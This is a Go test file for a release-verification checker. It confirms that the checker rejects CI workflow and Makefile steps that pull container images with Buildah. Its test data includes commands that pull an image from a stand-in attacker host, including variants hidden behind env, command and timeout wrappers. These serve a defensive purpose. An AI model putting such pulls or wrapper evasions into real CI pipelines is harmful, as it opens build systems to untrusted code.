package releaseverify

import (
	"path/filepath"
	"strings"
	"testing"
)

func TestVerifyCIContainerDownloadsRejectsBuildahWorkflowAcquisition(t *testing.T) {
	commands := map[string]string{
		"direct":          "buildah pull attacker.invalid/image:pinned",
		"environment":     "env -u HOME buildah pull attacker.invalid/image:pinned",
		"command wrapper": "command -- buildah pull attacker.invalid/image:pinned",
		"timeout wrapper": "timeout 5 buildah pull attacker.invalid/image:pinned",
	}
	for name, command := range commands {
		t.Run(name, func(t *testing.T) {
			root := writeCIContainerDownloadsFixture(t)
			path := filepath.Join(root, ".github", "workflows", "ci-docs.yml")
			source := readFixtureFile(t, path)
			anchor := "          pnpm build\n"
			if !strings.Contains(source, anchor) {
				t.Fatal("CI docs final run step fixture changed")
			}
			writeFixtureFile(t, path, strings.Replace(source, anchor, "          "+command+"\n", 1))
			if err := VerifyCIContainerDownloads(root); err == nil {
				t.Fatal("VerifyCIContainerDownloads accepted direct Buildah workflow acquisition")
			}
		})
	}
}

func TestVerifyCIContainerDownloadsRejectsBuildahBehindAuthorizedMakeRoute(t *testing.T) {
	commands := map[string]string{
		"direct":          "buildah pull attacker.invalid/image:pinned",
		"environment":     "env -u HOME buildah pull attacker.invalid/image:pinned",
		"command wrapper": "command -- buildah pull attacker.invalid/image:pinned",
		"timeout wrapper": "timeout 5 buildah pull attacker.invalid/image:pinned",
	}
	for name, command := range commands {
		t.Run(name, func(t *testing.T) {
			root := writeCIContainerDownloadsFixture(t)
			module := ".PHONY: android\nandroid:\n\t" + command + "\n"
			writeFixtureFile(t, filepath.Join(root, "mk", "buildah-route.mk"), module)
			appendMakeInclude(t, root, "mk/buildah-route.mk")
			writeFixtureFile(t, filepath.Join(root, ".github", "workflows", "ci-android.yml"), readRepositoryWorkflow(t, "ci-android.yml"))
			if err := VerifyCIContainerDownloads(root); err == nil {
				t.Fatal("VerifyCIContainerDownloads accepted Buildah acquisition behind an authorized Make route")
			}
		})
	}
}
